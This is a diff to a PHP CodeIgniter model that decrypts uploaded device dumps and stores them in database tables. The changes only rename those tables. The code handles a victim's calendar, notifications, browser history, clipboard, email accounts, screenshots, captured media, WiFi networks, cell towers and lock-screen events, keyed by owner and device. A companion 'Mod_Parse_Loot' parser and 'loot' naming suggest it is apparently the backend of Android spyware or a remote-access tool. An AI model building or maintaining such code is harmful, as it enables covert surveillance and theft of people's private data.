@@ -8,14 +8,14 @@ use CodeIgniter\Model;
  * Mod_Parse_Advanced
  *
  * Handles decryption and DB ingestion for all 8 Advanced Data Extractors:
- *   1. DeviceContextExtractor  → tbl_device_context
- *   2. NetworkInfoExtractor    → tbl_network_info + tbl_nearby_wifi
+ *   1. DeviceContextExtractor  → tbl_device_hardware_contexts
+ *   2. NetworkInfoExtractor    → tbl_system_network_info + tbl_telemetry_wifi_networks_nearby
  *   3. AccountsExtractor       → tbl_accounts
- *   4. CalendarExtractor       → tbl_calendar_events
- *   5. AppUsageExtractor       → tbl_app_usage + tbl_app_usage_sessions
- *   6. NotificationExtractor   → tbl_notifications
- *   7. BluetoothExtractor      → tbl_bluetooth + tbl_bluetooth_paired
- *   8. SensorProfileExtractor  → tbl_sensor_profile
+ *   4. CalendarExtractor       → tbl_extracted_calendar_events
+ *   5. AppUsageExtractor       → tbl_system_app_usage + tbl_system_app_usage_sessions
+ *   6. NotificationExtractor   → tbl_extracted_notifications
+ *   7. BluetoothExtractor      → tbl_telemetry_bluetooth_devices + tbl_telemetry_bluetooth_devices_paired
+ *   8. SensorProfileExtractor  → tbl_telemetry_sensors
  *
  * All methods follow the same pattern as Mod_Parse_Loot:
  *   - Read encrypted file from WRITEPATH/uploads/text_dump/
@@ -67,7 +67,7 @@ class Mod_Parse_Advanced extends Model
                 'updated_at'                 => $dated,
             ];
 
-            $this->db->table('tbl_device_context')->insert($data);
+            $this->db->table('tbl_device_hardware_contexts')->insert($data);
             log_message('info', '[parse_device_context] Inserted 1 row from ' . $file_name);
             return true;
 
@@ -143,7 +143,7 @@ class Mod_Parse_Advanced extends Model
                 'updated_at'             => $dated,
             ];
 
-            $this->db->table('tbl_network_info')->insert($mainData);
+            $this->db->table('tbl_system_network_info')->insert($mainData);
             $networkInfoId = $this->db->insertID();
 
             // Nearby WiFi child rows
@@ -163,7 +163,7 @@ class Mod_Parse_Advanced extends Model
                     ];
                 }
                 if (!empty($nearbyBatch)) {
-                    $this->db->table('tbl_nearby_wifi')->insertBatch($nearbyBatch);
+                    $this->db->table('tbl_telemetry_wifi_networks_nearby')->insertBatch($nearbyBatch);
                 }
             }
 
@@ -303,7 +303,7 @@ class Mod_Parse_Advanced extends Model
                 }
 
                 // Database duplicate check
-                $exists = $this->db->table('tbl_calendar_events')
+                $exists = $this->db->table('tbl_extracted_calendar_events')
                     ->where('owner_id', $owner_id)
                     ->where('device_id', $device_id)
                     ->where('event_id', $eventId)
@@ -366,7 +366,7 @@ class Mod_Parse_Advanced extends Model
             }
 
             if (!empty($batchData)) {
-                $this->db->table('tbl_calendar_events')->insertBatch($batchData);
+                $this->db->table('tbl_extracted_calendar_events')->insertBatch($batchData);
             }
 
             log_message('info', '[parse_calendar] Inserted ' . count($batchData) . ' calendar events from ' . $file_name);
@@ -433,7 +433,7 @@ class Mod_Parse_Advanced extends Model
                 }
 
                 // Upsert logic: skip if identical snapshot already stored
-                $exists = $this->db->table('tbl_app_usage')
+                $exists = $this->db->table('tbl_system_app_usage')
                     ->where('owner_id', $owner_id)
                     ->where('device_id', $device_id)
                     ->where('package_name', $packageName)
@@ -481,7 +481,7 @@ class Mod_Parse_Advanced extends Model
                     'updated_at'            => $dated,
                 ];
 
-                $this->db->table('tbl_app_usage')->insert($appData);
+                $this->db->table('tbl_system_app_usage')->insert($appData);
                 $usageId = $this->db->insertID();
                 $inserted++;
 
@@ -501,7 +501,7 @@ class Mod_Parse_Advanced extends Model
                         ];
                     }
                     if (!empty($sessBatch)) {
-                        $this->db->table('tbl_app_usage_sessions')->insertBatch($sessBatch);
+                        $this->db->table('tbl_system_app_usage_sessions')->insertBatch($sessBatch);
                     }
                 }
             }
@@ -562,7 +562,7 @@ class Mod_Parse_Advanced extends Model
                 }
 
                 // Database duplicate check
-                $exists = $this->db->table('tbl_notifications')
+                $exists = $this->db->table('tbl_extracted_notifications')
                     ->where('owner_id', $owner_id)
                     ->where('device_id', $device_id)
                     ->where('notification_id', $notifId)
@@ -618,7 +618,7 @@ class Mod_Parse_Advanced extends Model
             }
 
             if (!empty($batchData)) {
-                $this->db->table('tbl_notifications')->insertBatch($batchData);
+                $this->db->table('tbl_extracted_notifications')->insertBatch($batchData);
             }
 
             log_message('info', '[parse_notifications] Inserted ' . count($batchData) . ' notification rows from ' . $file_name);
@@ -659,7 +659,7 @@ class Mod_Parse_Advanced extends Model
                 'updated_at'      => $dated,
             ];
 
-            $this->db->table('tbl_bluetooth')->insert($btData);
+            $this->db->table('tbl_telemetry_bluetooth_devices')->insert($btData);
             $bluetoothId = $this->db->insertID();
 
             // Paired devices child rows
@@ -710,7 +710,7 @@ class Mod_Parse_Advanced extends Model
                     ];
                 }
                 if (!empty($pairedBatch)) {
-                    $this->db->table('tbl_bluetooth_paired')->insertBatch($pairedBatch);
+                    $this->db->table('tbl_telemetry_bluetooth_devices_paired')->insertBatch($pairedBatch);
                 }
             }
 
@@ -767,7 +767,7 @@ class Mod_Parse_Advanced extends Model
                 }
 
                 // Database duplicate check
-                $exists = $this->db->table('tbl_sensor_profile')
+                $exists = $this->db->table('tbl_telemetry_sensors')
                     ->where('owner_id', $owner_id)
                     ->where('device_id', $device_id)
                     ->where('type_id', $typeId)
@@ -815,7 +815,7 @@ class Mod_Parse_Advanced extends Model
             }
 
             if (!empty($batchData)) {
-                $this->db->table('tbl_sensor_profile')->insertBatch($batchData);
+                $this->db->table('tbl_telemetry_sensors')->insertBatch($batchData);
             }
 
             log_message('info', '[parse_sensors] Inserted ' . count($batchData) . ' sensor rows from ' . $file_name);
@@ -872,7 +872,7 @@ class Mod_Parse_Advanced extends Model
                 return false;
             }
 
-            // 6. Insert into tbl_captured_media
+            // 6. Insert into tbl_extracted_media_files
             $data = [
                 'owner_id'          => $owner_id,
                 'device_id'         => $device_id,
@@ -886,7 +886,7 @@ class Mod_Parse_Advanced extends Model
                 'updated_at'        => $dated,
             ];
 
-            $this->db->table('tbl_captured_media')->insert($data);
+            $this->db->table('tbl_extracted_media_files')->insert($data);
             log_message('info', '[parse_captured_media] Saved captured ' . $category . ' to ' . $newFileName);
             
             return true;
@@ -919,7 +919,7 @@ class Mod_Parse_Advanced extends Model
     // ─────────────────────────────────────────────────────────────────────────
 
     /**
-     * DeviceInfoExtractor → tbl_device_profile
+     * DeviceInfoExtractor → tbl_device_profiles
      * File category: deviceinfo / device_info
      * Stores a full hardware/software snapshot of the device.
      */
@@ -935,7 +935,7 @@ class Mod_Parse_Advanced extends Model
             $extracted_at = $json['extraction_timestamp'] ?? null;
 
             // Avoid duplicate snapshots for same device+timestamp
-            $exists = $this->db->table('tbl_device_profile')
+            $exists = $this->db->table('tbl_device_profiles')
                 ->where('device_id', $device_id)
                 ->where('extraction_timestamp', $extracted_at)
                 ->countAllResults() > 0;
@@ -1017,7 +1017,7 @@ class Mod_Parse_Advanced extends Model
                 'device_ip_address'           => $json['device_ip_address']          ?? null,
             ];
 
-            $this->db->table('tbl_device_profile')->insert($data);
+            $this->db->table('tbl_device_profiles')->insert($data);
             log_message('info', '[parse_device_info] Inserted device snapshot for device: ' . $device_id);
             return true;
 
@@ -1105,7 +1105,7 @@ class Mod_Parse_Advanced extends Model
     }
 
     /**
-     * ProcInfoExtractor → tbl_proc_info
+     * ProcInfoExtractor → tbl_system_running_processes
      * File category: proc_info
      * Stores /proc/* snapshot: meminfo, cpuinfo, stat, version, uptime, net interfaces, net connections
      */
@@ -1121,7 +1121,7 @@ class Mod_Parse_Advanced extends Model
             $extracted_at = $json['extracted_at'] ?? null;
 
             // Avoid duplicate snapshot for same device+timestamp
-            $exists = $this->db->table('tbl_proc_info')
+            $exists = $this->db->table('tbl_system_running_processes')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
@@ -1146,7 +1146,7 @@ class Mod_Parse_Advanced extends Model
                 'updated_at'              => $dated,
             ];
 
-            $this->db->table('tbl_proc_info')->insert($data);
+            $this->db->table('tbl_system_running_processes')->insert($data);
             log_message('info', '[parse_proc_info] Inserted proc snapshot for device: ' . $device_id);
             return true;
 
@@ -1157,7 +1157,7 @@ class Mod_Parse_Advanced extends Model
     }
 
     /**
-     * ProcessExtractor → tbl_running_processes + tbl_running_services
+     * ProcessExtractor → tbl_running_processes + tbl_system_running_services
      * File category: processes
      * Stores running app processes and services with usage stats
      */
@@ -1230,7 +1230,7 @@ class Mod_Parse_Advanced extends Model
                         'created_at'           => $dated,
                     ];
                 }
-                $this->db->table('tbl_running_process_details')->insertBatch($batch);
+                $this->db->table('tbl_system_running_process_details')->insertBatch($batch);
             }
 
             // Services
@@ -1253,7 +1253,7 @@ class Mod_Parse_Advanced extends Model
                         'created_at'           => $dated,
                     ];
                 }
-                $this->db->table('tbl_running_services')->insertBatch($batch);
+                $this->db->table('tbl_system_running_services')->insertBatch($batch);
             }
 
             // Usage stats (24h)
@@ -1286,7 +1286,7 @@ class Mod_Parse_Advanced extends Model
     }
 
     /**
-     * CameraInfoExtractor → tbl_camera_info
+     * CameraInfoExtractor → tbl_telemetry_cameras
      * File category: camera_info
      * Stores camera characteristics per camera ID
      */
@@ -1303,14 +1303,14 @@ class Mod_Parse_Advanced extends Model
             $cameras      = $json['cameras'] ?? [];
 
             // Avoid duplicate
-            $exists = $this->db->table('tbl_camera_info')
+            $exists = $this->db->table('tbl_telemetry_cameras')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
             if ($exists) return true;
 
             foreach ($cameras as $cam) {
-                $this->db->table('tbl_camera_info')->insert([
+                $this->db->table('tbl_telemetry_cameras')->insert([
                     'owner_id'              => $owner_id,
                     'device_id'             => $device_id,
                     'camera_id'             => $cam['camera_id'] ?? null,
@@ -1373,7 +1373,7 @@ class Mod_Parse_Advanced extends Model
     }
 
     /**
-     * BatteryStatsExtractor → tbl_battery_stats
+     * BatteryStatsExtractor → tbl_telemetry_battery_stats
      * File category: battery_stats
      * Stores detailed battery counters and health
      */
@@ -1389,13 +1389,13 @@ class Mod_Parse_Advanced extends Model
             $extracted_at = $json['extracted_at'] ?? null;
 
             // Avoid duplicate
-            $exists = $this->db->table('tbl_battery_stats')
+            $exists = $this->db->table('tbl_telemetry_battery_stats')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
             if ($exists) return true;
 
-            $this->db->table('tbl_battery_stats')->insert([
+            $this->db->table('tbl_telemetry_battery_stats')->insert([
                 'owner_id'              => $owner_id,
                 'device_id'             => $device_id,
                 'level_percent'         => $json['level_percent'] ?? null,
@@ -1428,7 +1428,7 @@ class Mod_Parse_Advanced extends Model
     }
 
     /**
-     * AccessibilityExtractor → tbl_accessibility_services
+     * AccessibilityExtractor → tbl_system_accessibility_services
      * File category: accessibility
      * Stores enabled accessibility services
      */
@@ -1445,14 +1445,14 @@ class Mod_Parse_Advanced extends Model
             $services     = $json['services'] ?? [];
 
             // Avoid duplicate
-            $exists = $this->db->table('tbl_accessibility_services')
+            $exists = $this->db->table('tbl_system_accessibility_services')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
             if ($exists) return true;
 
             foreach ($services as $svc) {
-                $this->db->table('tbl_accessibility_services')->insert([
+                $this->db->table('tbl_system_accessibility_services')->insert([
                     'owner_id'                    => $owner_id,
                     'device_id'                   => $device_id,
                     'service_id'                  => $svc['id'] ?? null,
@@ -1479,7 +1479,7 @@ class Mod_Parse_Advanced extends Model
     }
 
     /**
-     * InputMethodExtractor → tbl_input_methods + tbl_input_method_subtypes
+     * InputMethodExtractor → tbl_system_input_methods + tbl_system_input_method_subtypes
      * File category: input_methods
      * Stores enabled IMEs and their subtypes
      */
@@ -1496,14 +1496,14 @@ class Mod_Parse_Advanced extends Model
             $imes         = $json['input_methods'] ?? [];
 
             // Avoid duplicate
-            $exists = $this->db->table('tbl_input_methods')
+            $exists = $this->db->table('tbl_system_input_methods')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
             if ($exists) return true;
 
             foreach ($imes as $ime) {
-                $this->db->table('tbl_input_methods')->insert([
+                $this->db->table('tbl_system_input_methods')->insert([
                     'owner_id'     => $owner_id,
                     'device_id'    => $device_id,
                     'ime_id'       => $ime['id'] ?? null,
@@ -1534,7 +1534,7 @@ class Mod_Parse_Advanced extends Model
                             'created_at'                         => $dated,
                         ];
                     }
-                    $this->db->table('tbl_input_method_subtypes')->insertBatch($batch);
+                    $this->db->table('tbl_system_input_method_subtypes')->insertBatch($batch);
                 }
             }
 
@@ -1548,7 +1548,7 @@ class Mod_Parse_Advanced extends Model
     }
 
     /**
-     * CellTowerScanner → tbl_cell_towers
+     * CellTowerScanner → tbl_telemetry_cell_towers
      * File category: cell_towers
      * Stores neighboring cell tower information with CID, LAC, RSSI
      */
@@ -1565,14 +1565,14 @@ class Mod_Parse_Advanced extends Model
             $towers       = $json['cell_towers'] ?? [];
 
             // Avoid duplicate
-            $exists = $this->db->table('tbl_cell_towers')
+            $exists = $this->db->table('tbl_telemetry_cell_towers')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
             if ($exists) return true;
 
             foreach ($towers as $tower) {
-                $this->db->table('tbl_cell_towers')->insert([
+                $this->db->table('tbl_telemetry_cell_towers')->insert([
                     'owner_id'         => $owner_id,
                     'device_id'        => $device_id,
                     'tower_type'       => $tower['type'] ?? null,
@@ -1616,7 +1616,7 @@ class Mod_Parse_Advanced extends Model
     }
 
     /**
-     * DisplayInfoExtractor → tbl_display_info
+     * DisplayInfoExtractor → tbl_telemetry_display_info
      * File category: display_info
      * Stores display metrics, resolution, density, refresh rate
      */
@@ -1632,7 +1632,7 @@ class Mod_Parse_Advanced extends Model
             $extracted_at = $json['extracted_at'] ?? null;
 
             // Avoid duplicate
-            $exists = $this->db->table('tbl_display_info')
+            $exists = $this->db->table('tbl_telemetry_display_info')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
@@ -1640,7 +1640,7 @@ class Mod_Parse_Advanced extends Model
 
             $displays = $json['displays'] ?? [];
 
-            $this->db->table('tbl_display_info')->insert([
+            $this->db->table('tbl_telemetry_display_info')->insert([
                 'owner_id'          => $owner_id,
                 'device_id'         => $device_id,
                 'width_px'          => $json['width_px'] ?? null,
@@ -1677,7 +1677,7 @@ class Mod_Parse_Advanced extends Model
     }
 
     /**
-     * StorageExtractor → tbl_storage
+     * StorageExtractor → tbl_telemetry_storage_stats
      * File category: storage
      * Stores internal/external storage volumes
      */
@@ -1694,7 +1694,7 @@ class Mod_Parse_Advanced extends Model
             $volumes      = $json['volumes'] ?? [];
 
             // Avoid duplicate
-            $exists = $this->db->table('tbl_storage')
+            $exists = $this->db->table('tbl_telemetry_storage_stats')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
@@ -1702,7 +1702,7 @@ class Mod_Parse_Advanced extends Model
 
             foreach ($volumes as $vol) {
                 $info = $vol['info'] ?? [];
-                $this->db->table('tbl_storage')->insert([
+                $this->db->table('tbl_telemetry_storage_stats')->insert([
                     'owner_id'       => $owner_id,
                     'device_id'      => $device_id,
                     'volume_path'    => $vol['path'] ?? null,
@@ -1723,7 +1723,7 @@ class Mod_Parse_Advanced extends Model
 
             // App cache and data
             if (isset($json['app_cache'])) {
-                $this->db->table('tbl_storage')->insert([
+                $this->db->table('tbl_telemetry_storage_stats')->insert([
                     'owner_id'       => $owner_id,
                     'device_id'      => $device_id,
                     'volume_path'    => 'app_cache',
@@ -1739,7 +1739,7 @@ class Mod_Parse_Advanced extends Model
                 ]);
             }
             if (isset($json['app_data'])) {
-                $this->db->table('tbl_storage')->insert([
+                $this->db->table('tbl_telemetry_storage_stats')->insert([
                     'owner_id'       => $owner_id,
                     'device_id'      => $device_id,
                     'volume_path'    => 'app_data',
@@ -1765,7 +1765,7 @@ class Mod_Parse_Advanced extends Model
     }
 
     /**
-     * ThermalExtractor → tbl_thermal
+     * ThermalExtractor → tbl_telemetry_thermal
      * File category: thermal
      * Stores thermal zones, CPU throttle, CPU frequencies
      */
@@ -1784,14 +1784,14 @@ class Mod_Parse_Advanced extends Model
             $cpu_freqs    = $json['cpu_frequencies'] ?? [];
 
             // Avoid duplicate
-            $exists = $this->db->table('tbl_thermal')
+            $exists = $this->db->table('tbl_telemetry_thermal')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
             if ($exists) return true;
 
             foreach ($zones as $zone) {
-                $this->db->table('tbl_thermal')->insert([
+                $this->db->table('tbl_telemetry_thermal')->insert([
                     'owner_id'     => $owner_id,
                     'device_id'    => $device_id,
                     'zone_name'    => $zone['zone'] ?? null,
@@ -1806,7 +1806,7 @@ class Mod_Parse_Advanced extends Model
             }
 
             foreach ($cpu_throttle as $throttle) {
-                $this->db->table('tbl_thermal')->insert([
+                $this->db->table('tbl_telemetry_thermal')->insert([
                     'owner_id'     => $owner_id,
                     'device_id'    => $device_id,
                     'cpu_name'     => $throttle['cpu'] ?? null,
@@ -1820,7 +1820,7 @@ class Mod_Parse_Advanced extends Model
             }
 
             foreach ($cpu_freqs as $freq) {
-                $this->db->table('tbl_thermal')->insert([
+                $this->db->table('tbl_telemetry_thermal')->insert([
                     'owner_id'         => $owner_id,
                     'device_id'        => $device_id,
                     'cpu_name'         => $freq['cpu'] ?? null,
@@ -1844,7 +1844,7 @@ class Mod_Parse_Advanced extends Model
     }
 
     /**
-     * NfcExtractor → tbl_nfc
+     * NfcExtractor → tbl_telemetry_nfc
      * File category: nfc
      * Stores NFC adapter state and features
      */
@@ -1860,13 +1860,13 @@ class Mod_Parse_Advanced extends Model
             $extracted_at = $json['extracted_at'] ?? null;
 
             // Avoid duplicate
-            $exists = $this->db->table('tbl_nfc')
+            $exists = $this->db->table('tbl_telemetry_nfc')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
             if ($exists) return true;
 
-            $this->db->table('tbl_nfc')->insert([
+            $this->db->table('tbl_telemetry_nfc')->insert([
                 'owner_id'           => $owner_id,
                 'device_id'          => $device_id,
                 'nfc_available'      => isset($json['nfc_available']) ? ($json['nfc_available'] ? 1 : 0) : 0,
@@ -1967,7 +1967,7 @@ class Mod_Parse_Advanced extends Model
     }
 
     /**
-     * SavedWifiExtractor → tbl_saved_wifi
+     * SavedWifiExtractor → tbl_telemetry_wifi_networks
      * File category: saved_wifi
      * Stores configured/saved WiFi networks
      */
@@ -1984,14 +1984,14 @@ class Mod_Parse_Advanced extends Model
             $networks     = $json['saved_networks'] ?? [];
 
             // Avoid duplicate
-            $exists = $this->db->table('tbl_saved_wifi')
+            $exists = $this->db->table('tbl_telemetry_wifi_networks')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
             if ($exists) return true;
 
             foreach ($networks as $net) {
-                $this->db->table('tbl_saved_wifi')->insert([
+                $this->db->table('tbl_telemetry_wifi_networks')->insert([
                     'owner_id'       => $owner_id,
                     'device_id'      => $device_id,
                     'ssid'           => $net['ssid'] ?? null,
@@ -2069,7 +2069,7 @@ class Mod_Parse_Advanced extends Model
     }
 
     /**
-     * DefaultAppsExtractor → tbl_default_apps
+     * DefaultAppsExtractor → tbl_system_default_apps_device
      * File category: default_apps
      * Stores default browser, dialer, SMS, launcher, etc.
      */
@@ -2085,7 +2085,7 @@ class Mod_Parse_Advanced extends Model
             $extracted_at = $json['extracted_at'] ?? null;
 
             // Avoid duplicate
-            $exists = $this->db->table('tbl_default_apps')
+            $exists = $this->db->table('tbl_system_default_apps_device')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
@@ -2106,7 +2106,7 @@ class Mod_Parse_Advanced extends Model
             foreach ($handlerFields as $jsonKey => $handlerType) {
                 $app = $json[$jsonKey] ?? [];
                 if (!empty($app) && is_array($app) && isset($app['package_name'])) {
-                    $this->db->table('tbl_default_apps')->insert([
+                    $this->db->table('tbl_system_default_apps_device')->insert([
                         'owner_id'     => $owner_id,
                         'device_id'    => $device_id,
                         'handler_type' => $handlerType,
@@ -2120,7 +2120,7 @@ class Mod_Parse_Advanced extends Model
             }
 
             if (isset($json['default_sms_package'])) {
-                $this->db->table('tbl_default_apps')->insert([
+                $this->db->table('tbl_system_default_apps_device')->insert([
                     'owner_id'     => $owner_id,
                     'device_id'    => $device_id,
                     'handler_type' => 'sms_package',
@@ -2140,7 +2140,7 @@ class Mod_Parse_Advanced extends Model
     }
 
     /**
-     * AlarmsExtractor → tbl_alarms
+     * AlarmsExtractor → tbl_system_alarms
      * File category: alarms
      * Stores JobScheduler jobs and AlarmManager alarms
      */
@@ -2158,14 +2158,14 @@ class Mod_Parse_Advanced extends Model
             $alarms       = $json['alarm_clocks'] ?? [];
 
             // Avoid duplicate
-            $exists = $this->db->table('tbl_alarms')
+            $exists = $this->db->table('tbl_system_alarms')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
             if ($exists) return true;
 
             foreach ($jobs as $job) {
-                $this->db->table('tbl_alarms')->insert([
+                $this->db->table('tbl_system_alarms')->insert([
                     'owner_id'           => $owner_id,
                     'device_id'          => $device_id,
                     'alarm_type'         => 'job',
@@ -2188,7 +2188,7 @@ class Mod_Parse_Advanced extends Model
             }
 
             foreach ($alarms as $alarm) {
-                $this->db->table('tbl_alarms')->insert([
+                $this->db->table('tbl_system_alarms')->insert([
                     'owner_id'     => $owner_id,
                     'device_id'    => $device_id,
                     'alarm_type'   => 'alarm_clock',
@@ -2339,13 +2339,13 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
                 'created_at'     => $dated,
             ];
 
-            $exists = $this->db->table('tbl_app_security')
+            $exists = $this->db->table('tbl_system_app_security')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
             if ($exists) return true;
 
-            $this->db->table('tbl_app_security')->insert($data);
+            $this->db->table('tbl_system_app_security')->insert($data);
             log_message('info', '[parse_app_security] Inserted app security snapshot for device: ' . $device_id);
             return true;
 
@@ -2530,7 +2530,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
                 $name = $perm['permission_name'] ?? null;
                 if (!$pkg || !$name) continue;
 
-                $exists = $this->db->table('tbl_app_permissions')
+                $exists = $this->db->table('tbl_system_app_permissions')
                     ->where('owner_id', $owner_id)
                     ->where('device_id', $device_id)
                     ->where('package_name', $pkg)
@@ -2564,7 +2564,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
             }
 
             if (!empty($batch)) {
-                $this->db->table('tbl_app_permissions')->insertBatch($batch);
+                $this->db->table('tbl_system_app_permissions')->insertBatch($batch);
             }
 
             log_message('info', '[parse_app_permissions] Inserted ' . count($batch) . ' permissions from ' . $file_name);
@@ -2598,7 +2598,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
                 $url = $item['url'] ?? null;
                 if (!$url) continue;
 
-                $exists = $this->db->table('tbl_browser_history')
+                $exists = $this->db->table('tbl_extracted_browser_history')
                     ->where('owner_id', $owner_id)
                     ->where('device_id', $device_id)
                     ->where('url', $url)
@@ -2633,7 +2633,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
             }
 
             if (!empty($batch)) {
-                $this->db->table('tbl_browser_history')->insertBatch($batch);
+                $this->db->table('tbl_extracted_browser_history')->insertBatch($batch);
             }
 
             log_message('info', '[parse_browser_history] Inserted ' . count($batch) . ' history rows from ' . $file_name);
@@ -2680,7 +2680,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
                 'updated_at' => $dated,
             ];
 
-            $this->db->table('tbl_clipboard')->insert($data);
+            $this->db->table('tbl_extracted_clipboard_entries')->insert($data);
             log_message('info', '[parse_clipboard] Inserted clipboard snapshot for device: ' . $device_id);
             return true;
 
@@ -2779,7 +2779,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
                 $crashTime = $crash['crash_time'] ?? null;
                 if ($pid === null || !$crashTime) continue;
 
-                $exists = $this->db->table('tbl_crash_logs')
+                $exists = $this->db->table('tbl_system_crash_logs')
                     ->where('owner_id', $owner_id)
                     ->where('device_id', $device_id)
                     ->where('pid', $pid)
@@ -2818,7 +2818,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
             }
 
             if (!empty($batch)) {
-                $this->db->table('tbl_crash_logs')->insertBatch($batch);
+                $this->db->table('tbl_system_crash_logs')->insertBatch($batch);
             }
 
             log_message('info', '[parse_crash_logs] Inserted ' . count($batch) . ' crashes from ' . $file_name);
@@ -2845,7 +2845,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
 
             $extracted_at = $json['extracted_at'] ?? null;
 
-            $exists = $this->db->table('tbl_digital_wellbeing')
+            $exists = $this->db->table('tbl_system_digital_wellbeing')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
@@ -2875,7 +2875,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
                 'updated_at' => $dated,
             ];
 
-            $this->db->table('tbl_digital_wellbeing')->insert($data);
+            $this->db->table('tbl_system_digital_wellbeing')->insert($data);
             $wellbeingId = $this->db->insertID();
 
             $apps = $json['apps'] ?? [];
@@ -2896,7 +2896,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
                     ];
                 }
                 if (!empty($appBatch)) {
-                    $this->db->table('tbl_digital_wellbeing_apps')->insertBatch($appBatch);
+                    $this->db->table('tbl_system_digital_wellbeing_apps')->insertBatch($appBatch);
                 }
             }
 
@@ -2924,7 +2924,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
 
             $extracted_at = $json['extracted_at'] ?? null;
 
-            $exists = $this->db->table('tbl_doze_standby')
+            $exists = $this->db->table('tbl_system_doze_standby')
                 ->where('device_id', $device_id)
                 ->where('extracted_at', $extracted_at)
                 ->countAllResults() > 0;
@@ -2949,7 +2949,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
                 'updated_at' => $dated,
             ];
 
-            $this->db->table('tbl_doze_standby')->insert($data);
+            $this->db->table('tbl_system_doze_standby')->insert($data);
             $dozeId = $this->db->insertID();
 
             $apps = $json['apps'] ?? [];
@@ -2973,7 +2973,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
                     ];
                 }
                 if (!empty($appBatch)) {
-                    $this->db->table('tbl_doze_standby_apps')->insertBatch($appBatch);
+                    $this->db->table('tbl_system_doze_standby_apps')->insertBatch($appBatch);
                 }
             }
 
@@ -3008,7 +3008,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
                 $email = $account['account_email'] ?? null;
                 if (!$email) continue;
 
-                $exists = $this->db->table('tbl_email_accounts')
+                $exists = $this->db->table('tbl_extracted_email_accounts')
                     ->where('owner_id', $owner_id)
                     ->where('device_id', $device_id)
                     ->where('account_email', $email)
@@ -3031,7 +3031,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
             }
 
             if (!empty($batch)) {
-                $this->db->table('tbl_email_accounts')->insertBatch($batch);
+                $this->db->table('tbl_extracted_email_accounts')->insertBatch($batch);
             }
 
             log_message('info', '[parse_email] Inserted ' . count($batch) . ' email accounts from ' . $file_name);
@@ -3210,7 +3210,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
                 'updated_at' => $dated,
             ];
 
-            $this->db->table('tbl_keyguard_events')->insert($data);
+            $this->db->table('tbl_system_keyguard_events')->insert($data);
             log_message('info', '[parse_keyguard] Inserted keyguard snapshot for device: ' . $device_id);
             return true;
 
@@ -3243,7 +3243,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
                 $timestamp = $item['timestamp'] ?? null;
                 if (!$filePath || !$timestamp) continue;
 
-                $exists = $this->db->table('tbl_screenshots')
+                $exists = $this->db->table('tbl_extracted_screenshots')
                     ->where('owner_id', $owner_id)
                     ->where('device_id', $device_id)
                     ->where('file_path', $filePath)
@@ -3284,7 +3284,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
             }
 
             if (!empty($batch)) {
-                $this->db->table('tbl_screenshots')->insertBatch($batch);
+                $this->db->table('tbl_extracted_screenshots')->insertBatch($batch);
             }
 
             log_message('info', '[parse_screenshots] Inserted ' . count($batch) . ' screenshots from ' . $file_name);
@@ -3425,7 +3425,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
                 $pid = $proc['pid'] ?? null;
                 if ($pid === null) continue;
 
-                $exists = $this->db->table('tbl_running_processes_detailed')
+                $exists = $this->db->table('tbl_system_running_processes_detailed')
                     ->where('owner_id', $owner_id)
                     ->where('device_id', $device_id)
                     ->where('pid', $pid)
@@ -3494,7 +3494,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
             }
 
             if (!empty($batch)) {
-                $this->db->table('tbl_running_processes_detailed')->insertBatch($batch);
+                $this->db->table('tbl_system_running_processes_detailed')->insertBatch($batch);
             }
 
